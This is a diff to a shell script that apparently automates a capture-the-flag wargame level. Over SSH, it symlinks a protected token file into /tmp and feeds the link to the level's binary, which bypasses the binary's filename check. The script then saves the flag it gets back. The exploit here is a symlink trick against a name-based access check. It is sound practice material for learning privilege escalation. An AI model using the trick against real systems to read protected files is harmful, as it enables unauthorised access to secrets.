@@ -109,12 +109,13 @@ main() {
     level08_password=$(cat "$CURR_DIR_PATH/../../level07/flag");
 
     init_ssh_socket "$level08_socket_path" "$host" "$port" "$level08_username" "$level08_password";
-    ssh_exec_via_socket "$level08_socket_path" "$host" "$port" "$level08_username" "echo 'Salut'";
+    ssh_exec_via_socket "$level08_socket_path" "$host" "$port" "$level08_username" "ln -s /home/user/level08/token /tmp/exploit";
+    checkflag=$(ssh_exec_via_socket "$level08_socket_path" "$host" "$port" "$level08_username" "/home/user/level08/level08 /tmp/exploit");
     close_ssh_socket "$level08_socket_path" "$host" "$port" "$level08_username";
 
-    # flag_outpath="$CURR_DIR_PATH/../flag";
-    # echo "Checkflag: $checkflag";
-    # echo -n "$checkflag" > "$flag_outpath";
+    flag_outpath="$CURR_DIR_PATH/../flag";
+    echo "Checkflag: $checkflag";
+    echo -n "$checkflag" > "$flag_outpath";
 }
 
 main "$@";
